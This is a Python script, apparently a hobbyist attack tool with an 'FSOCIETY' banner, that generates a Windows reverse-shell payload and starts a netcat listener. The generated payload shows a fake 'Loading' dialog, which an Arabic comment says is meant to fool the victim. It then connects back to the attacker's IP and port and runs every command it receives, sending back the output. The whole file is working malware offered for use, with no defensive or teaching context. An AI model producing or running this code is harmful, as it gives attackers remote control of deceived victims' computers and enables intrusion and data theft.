import os

BANNER = """
  ____  _               _                 ______            _
 / ___|| |__   __ _ ___| |__   ___ _ __  |  ____|          | |
 \___ \| '_ \ / _` / __| '_ \ / _ \ '__| | |__  __  ___ __ | | ___  _ __
  ___) | | | | (_| \__ \ | | |  __/ |    |  __| \ \/ / '_ \| |/ _ \| '__|
 |____/|_| |_|\\__,_|___/_| |_|\\___|_|    |_|     >  <| |_) | | (_) | |
                                              /_/\\_\\ .__/|_|\\___/|_|
                                                   |_|   FSOCIETY v1.0
"""

def ask_ip_port():
    host = input("[+] Enter your IP address: ")
    port = input("[+] Enter the port to listen on: ")
    return host, int(port)

def generate_windows_payload(host, port):
    payload_code = f"""
import socket
import subprocess
import ctypes

def connect():
    # إيهام الضحية برسالة تحميل
    ctypes.windll.user32.MessageBoxW(0, "Loading... Please wait.", "Loading", 0x40 | 0x1)

    s = socket.socket()
    try:
        s.connect(('{host}', {port}))
    except:
        return
    while True:
        try:
            data = s.recv(1024).decode()
            if data.lower() == 'exit':
                break
            output = subprocess.getoutput(data)
            s.send(output.encode())
        except:
            break
    s.close()

if __name__ == "__main__":
    connect()
"""
    with open("shadow_payload_windows.py", "w") as f:
        f.write(payload_code)
    print("[+] Payload saved as shadow_payload_windows.py")

def start_listener(host, port):
    print(f"[*] Listening on {host}:{port} ... (Press Ctrl+C to quit)")
    os.system(f"nc -lvnp {port}")

def main():
    print(BANNER)
    host, port = ask_ip_port()
    generate_windows_payload(host, port)
    start_listener(host, port)

if __name__ == "__main__":
    main()
